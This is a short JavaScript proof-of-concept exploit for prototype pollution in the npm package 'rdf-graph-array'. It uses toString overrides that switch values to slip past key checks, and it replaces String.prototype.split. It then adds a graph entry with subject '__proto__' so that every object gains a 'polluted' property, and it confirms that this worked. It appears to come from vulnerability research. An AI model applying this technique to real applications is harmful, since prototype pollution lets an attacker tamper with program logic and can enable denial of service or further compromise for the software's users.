var arg1 = ['constructor'];
var arg2 = ['prototype'];
var flag1 = true;
var flag2 = true;
arg1.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return 'constructor';
    }
};
arg2.toString = function () {
    if (flag2) {
        flag2 = false;
        return 'foo';
    } else {
        return 'prototype';
    }
};
String.prototype.split = function () {
    return [
        arg1,
        arg2,
        'polluted'
    ];
};
const Graph = require('rdf-graph-array').Graph;
let g = new Graph();
console.log({}.polluted);
g.add({
    graph: 'foo',
    subject: '__proto__',
    predicate: 'polluted',
    object: 'JHU'
});
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}